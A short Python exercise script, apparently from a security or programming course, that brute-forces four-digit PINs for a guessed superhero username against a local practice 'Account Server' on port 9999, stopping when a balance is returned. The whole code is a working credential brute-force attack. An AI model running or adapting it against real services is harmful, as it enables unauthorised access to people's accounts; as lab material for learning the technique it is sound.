# Run the Account Server service, which should run on port 9999.  You can interact with it on the command line
# using 'nc localhost 9999'.  There is a known test account called 'test' with pin '1234'.
# This service is known to be used by famous superheros.  They will usually use their secret identity's last
# name (in lowercase) as a login.  So start by making a list of 4-5 superhero last names.
#
# Hints:
#  - Remember that for loops can cover a range, eg:   for x in range(0,10): will loop from 0 to 9
#  - You may have to play with doing an extra recv() to get a prompt
#  - Test your logic with a couple of loops using the test account to make sure it works.
#  - Don't forget to close your socket when done


import socket
import time

s = socket.socket()
s.connect(('127.0.0.1', 9999))
s.send(b' ')
s.recv(1024).decode('ascii', 'ignore')
usernames = ['prince']

for username in usernames:
    print("Testing {}".format(username))
    for pin in range(1000, 10000):
        time.sleep(0.01)
        command = 'list {} {}'.format(username, pin)
        # print(command)
        s.send(command.encode('ascii'))
        response = s.recv(1024).decode('ascii', 'ignore')
        if response.find('balance') > -1:
            print(command)
            print(response)
            break

s.close()